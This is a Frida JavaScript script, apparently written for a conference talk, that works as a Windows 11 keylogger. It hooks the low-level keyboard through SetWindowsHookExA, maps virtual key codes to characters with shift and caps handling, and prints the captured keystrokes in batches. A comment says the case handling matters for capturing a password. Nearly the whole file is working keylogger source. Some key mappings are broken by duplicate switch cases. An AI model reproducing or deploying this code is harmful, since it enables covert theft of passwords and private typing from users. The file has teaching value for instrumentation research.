// Windows 11 Keylogger implementation with Frida script.
// (c) Román Ramírez - books@juliusdeane.com
//                     rramirez@rootedcon.com
// For sh3llcon 2024!

// Lot of learning from this Frida script:
// https://github.com/sensepost/frida-windows-playground/blob/master/SetWindowsHookExA_keylogger.js

// Several APIs to check and understand:
// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
// HHOOK SetWindowsHookExA(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);

// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-callnexthookex
// LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);

// https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex
// BOOL UnhookWindowsHookEx(HHOOK hhk);

// https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getmodulehandlea
// HMODULE GetModuleHandleA(LPCSTR lpModuleName);

// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getkeystate
// SHORT GetKeyState(int nVirtKey);

// https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessagea
// BOOL GetMessageA(LPMSG lpMsg, HWND  hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);

var hhook_id = 0;
var capture_buffer = [];
var keystroke_count = 0;
var total_keystroke_count = 0;
var unhookCmdString = 'NO_unhookunhook';  // start showing a message to verify is working!
// Will dump keystrokes every <24> (or whatever you set here).
// IMPORTANT: caps, shift, ... increase the counter
const dump_every_count_characters = 24;

var capsSet = false;

console.log('[BEGIN Frida script] Enter: going to set up handlers.')

var setWindowsHookExA_ptr = Module.getExportByName('user32.dll',
                                                   'SetWindowsHookExA');
var callNextHookEx_ptr = Module.getExportByName('user32.dll',
                                                'CallNextHookEx');
var unhookWindowsHookEx_ptr = Module.findExportByName('user32.dll',
                                                     'UnhookWindowsHookEx');

// We will read key state with this API: to be able to see if SHIFT
// or CAPS are pressed (not the same a vs A if we are to capture a
// password ;)
var getKeyState_ptr = Module.getExportByName('user32.dll', 'GetKeyState');
// This API is to build a wheel, a bucle where we will check every
// n milliseconds if there any message available (unchaining the callback).
var getMessage_ptr = Module.getExportByName('user32.dll', 'GetMessageA');
// getModuleHandleA: just need to pass the result of getModuleHandleA(NULL)
// to setHook...
var getModuleHandleA_ptr = Module.getExportByName('kernel32.dll',
                                                  'GetModuleHandleA');

// Here my Handles. Will try to add comments and explanations
// to make everything clear.
var setWindowsHookExA = new NativeFunction(setWindowsHookExA_ptr,
                                          'pointer',   // return HHOOK
                                          [
                                           'int',      // int idHook
                                            'pointer', // HOOKPROC lpfn
                                            'pointer', // HINSTANCE hmod
                                            'int'      // DWORD dwThreadId
                                          ]);
var callNextHookEx = new NativeFunction(callNextHookEx_ptr,
                                       'pointer',    // return LRESULT
                                       [
                                        'pointer',   // HHOOK hhk
                                         'int',      // int nCode
                                         'pointer',  // WPARAM wParam
                                         'pointer'   // LPARAM lParam
                                       ]);

// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex
// BOOL UnhookWindowsHookEx(
//  [in] HHOOK hhk
//  );                                       
var unhookWindowsHookEx = new NativeFunction(unhookWindowsHookEx_ptr,
                                            'int',          // BOOL
                                             ['pointer']);  // pointer to HHOOK

// Not entering in details here, please read the API details on the
// Microsoft documentations.
var getModuleHandleA = new NativeFunction(getModuleHandleA_ptr,
                                          'pointer',
                                          ['pointer']);
var getMessage = new NativeFunction(getMessage_ptr,
                                    'int',
                                    ['pointer', 'pointer', 'int', 'int']);
var getKeyState = new NativeFunction(getKeyState_ptr,
                                     'int',
                                     ['int']);

console.log('[HANDLERS SET] Make some constants definitions.')

// Will hook only KEYBOARD activities: WH_KEYBOARD_LL.
// https://docs.microsoft.com/en-us/windows/desktop/inputdev/keyboard-input-notifications
const WH_KEYBOARD_LL = 13;

// Some mnemonics for specific events and keys.
// https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
const WM_KEYUP = 0x101;
const WM_KEYDOWN = 0x100;
const WM_SYSKEYDOWN = 0x104;
const VK_CAPITAL = 0x14;
const VK_LSHIFT = 0xA0;
const VK_RSHIFT = 0xA1;

// We create HHOOK as a NativePointer (pointer)
const HHOOK = new NativePointer(Process.pointerSize);

// Shift&Caps key flags.
var SHIFT_PRESSED = false;
var CAPS_PRESSED = false;

console.log('[parseKey SET] Function to transform keystrokes in "characters".')
// intkey to character (and making a difference on lower vs upper).
// TODO: include extra characters that are not identified, like ñ.
const parseKey = function (code, caps, shift) {
 // Source: https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger/blob/
 // master/SetWindowsHookEx-Keylogger/SetWindowsHookEx-Keylogger/SetWindowsHookEx-Keylogger.cpp#L31
 var key;

 switch (code) {
   case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
   case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
   case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
   case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
   case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
   case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
   case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
   case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
   case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
   case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
   case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
   case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
   case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
   case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
   case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
   case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
   case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
   case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
   case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
   case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
   case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
   case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
   case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
   case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
   case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
   case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;

   // https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codesunknown-key
   // Documentation does not match here: 0 is 48 decimal (0x30), 1 is 49 (0x31)...
   case 0x30: key = "0"; break;
   case 0x31: key = "1"; break;
   case 0x32: key = "2"; break;
   case 0x33: key = "3"; break;
   case 0x34: key = "4"; break;
   case 0x35: key = "5"; break;
   case 0x36: key = "6"; break;
   case 0x37: key = "7"; break;
   case 0x38: key = "8"; break;
   case 0x39: key = "9"; break;

   case 0x6A: key = "*"; break;
   case 0x6B: key = "+"; break;
   case 0x6C: key = "-"; break;
   case 0x6D: key = "-"; break;
   case 0x6E: key = "."; break;
   case 0x6F: key = "/"; break;

   // Keys
   case 0x90: key = "[num lock]"; break;
   case 0x91: key = "[scroll lock]"; break;
   case 0x08: key = "[backspace]"; break;
   case 0x09: key = "[tab]]"; break;
   case 0x0D: key = "[enter]"; break;
   case 0x10: key = "[shift]"; break;
   case 0x11: key = "[ctrl]"; break;
   case 0x12: key = "[alt]"; break;
   case 0x14: key = "[capslock]"; break;
   case 0x1B: key = "[esc]"; break;
   case 0x20: key = "[space]"; break;
   case 0x21: key = "[page up]"; break;
   case 0x22: key = "[page down]"; break;
   case 0x23: key = "[end]"; break;
   case 0x24: key = "[home]"; break;
   case 0x25: key = "[left]"; break;
   case 0x26: key = "[up]"; break;
   case 0x27: key = "[right]"; break;
   case 0x28: key = "[down]"; break;
   case 0x2D: key = "[insert]"; break;
   case 0x2E: key = "[delete]"; break;

   case 0x30: key = shift ? "!" : "1"; break;
   case 0x31: key = shift ? "@" : "2"; break;
   case 0x32: key = shift ? "#" : "3"; break;
   case 0x33: key = shift ? "$" : "4"; break;
   case 0x34: key = shift ? "%" : "5"; break;
   case 0x35: key = shift ? "^" : "6"; break;
   case 0x36: key = shift ? "&" : "7"; break;
   case 0x37: key = shift ? "*" : "8"; break;
   case 0x38: key = shift ? "(" : "9"; break;
   case 0x39: key = shift ? ")" : "0"; break;

   case 0x5B: key = "[left super]"; break;
   case 0x5C: key = "[right super]"; break;
   case 0xA0: key = "[left shift]"; break;
   case 0xA1: key = "[right shift]"; break;
   case 0xA2: key = "[left control]"; break;
   case 0xA3: key = "[right control]"; break;

  // SPANISH!!!!
  //key=[[unknown-key (192)]]{0xc0} (15)
   case 0xc0: key = "ñ"; break;

   default: key = "[unknown-key (" + code + ")]"; break;
 }

 return key;
}

console.log('[kb_Hook_ptr CREATE] We define a new NativeCallback for our HookCallback.')
// Here we create our callback function! Frida is AWESOME.
// Pay attention as this is new <--
//
// Step 1. We create a standard JavaScript function with the arguments
// that the callback requires.
// Step 2. But we create the function as the first argument for the
// function NativeCallback: https://frida.re/docs/javascript-api/#nativecallback
//    func: is a JavaScript function.
//
// So we are creating a callback, for an API that we imported from a DLL
// running on a remote computer, instrumented by Frida... passing a
// JavaScript function. If you are not shocked by this simplicity, you
// have no heart :)
//
// Step 3, we return a pointer from NativeCallback creation as any other
// pointer when we addressed the location of an export on a module.
const kb_Hook_ptr = new NativeCallback(function (nCode, wParam, lParam) {
 // lParam ->
 //  https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct
 //
 // typedef struct tagKBDLLHOOKSTRUCT {
 //   DWORD     vkCode;
 //   DWORD     scanCode;
 //   DWORD     flags;
 //   DWORD     time;
 //   ULONG_PTR dwExtraInfo;
 // } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

 if (nCode < 0) {
   return callNextHookEx(HHOOK, nCode, wParam, lParam);
 }
 
 // read the key byte from (KBDLLHOOKSTRUCT*)lParam
 // lParam->vkCode
 var key = lParam.readInt();

 // Check for shift key
 if (key == VK_LSHIFT || key == VK_RSHIFT) {
   if (parseInt(wParam) == WM_KEYDOWN) {
     SHIFT_PRESSED = true;
   } else if (parseInt(wParam) == WM_KEYUP) {
     SHIFT_PRESSED = false;
   } else {
     SHIFT_PRESSED = false;
   }
 }

 // Leave early if we don't have an interesting keypress
 if (!(parseInt(wParam) == WM_KEYDOWN || parseInt(wParam) == WM_SYSKEYDOWN)) {
   return callNextHookEx(HHOOK, nCode, wParam, lParam);
 }

 if (getKeyState(VK_CAPITAL) > 0) {
   CAPS_PRESSED = true;
 }

 var parsedKey = parseKey(key, CAPS_PRESSED, SHIFT_PRESSED);

 console.log('key=[' + parsedKey + ']{0x' + key.toString(16) + '} (' + keystroke_count + ')');

 // check for command
 unhookCmdString += parsedKey;
 if(unhookCmdString.length >= 12) {
  console.log('[MAYBE UNHOOK REQUESTED] string=[' + unhookCmdString + ']');

    if(unhookCmdString != 'unhookunhook') {
      unhookCmdString = '';
    } else {
      // Ignore result.
      // Tidy up after getting out.
      console.log('[UNHOOK REQUESTED] Going to remove hook.');
      var r = unhookWindowsHookEx( ptr(hhook_id) );
      console.log('[UNHOOK REQUESTED] Hook REMOVED.');      
    }
}

 capture_buffer.push(parsedKey);
 if(keystroke_count >= dump_every_count_characters){
   keystroke_count = 0;
   console.log(capture_buffer.join());
 }
 else{
   keystroke_count++;
 }
 total_keystroke_count++;

 return callNextHookEx(HHOOK, nCode, wParam, lParam);
},
   'pointer',    // returns a pointer
   [
     'int',      // pass the code to next hook
     'pointer',  // wParam
     'pointer'   // lParam
   ]
);

console.log('[kb_hook_callback CREATE] We define a new NativeFunction from our HookCallback [kb_Hook_ptr].')
// Step 4. We create a NativeFunction using the pointer: kb_Hook_ptr.
// My mind is blowing here :)
const kb_hook_callback = new NativeFunction(kb_Hook_ptr,
                                           'pointer',
                                           [
                                             'int',
                                             'pointer',
                                             'pointer'
                                           ]);

console.log('============================================');
console.log('[CRITICAL POINT] Trying to install the hook.');
console.log('============================================');

// Depending on the status of the remote host, this has
// more or less a possibility of failing.

// hhook_id is ketp to be used with unhook :)
hhook_id = setWindowsHookExA(WH_KEYBOARD_LL,
                             kb_Hook_ptr,
                             getModuleHandleA(NULL),
                             0);
console.log('[CRITICAL POINT PASSED] Hook installed! SUCCESS!')
// IMPORTANT: wit this hhook_id value, we can invoke
// unhookWindowsHookEx(hhook_id) to remove our hook and
// make a clean exit.
// IMPORTANT: this is a POINTER to a memory position with a value, we 

// HHOOK:
// typedef struct HHOOK__ {
//  int unused;
//} *HHOOK;

console.log('    Hook result ID [' + hhook_id + '].');

console.log('[STOP FOR BUCLE] Process messages.');

var counter = 0;
var msg = new NativePointer(Process.pointerSize);
setTimeout(function () {
 while (getMessage(msg, NULL, 0, 0) > 0) {
   console.log('[' + counter + '] message: ' + msg);
   counter++;
 }
}, 150);

console.log('=== GET OUT FROM FRIDA script ===')
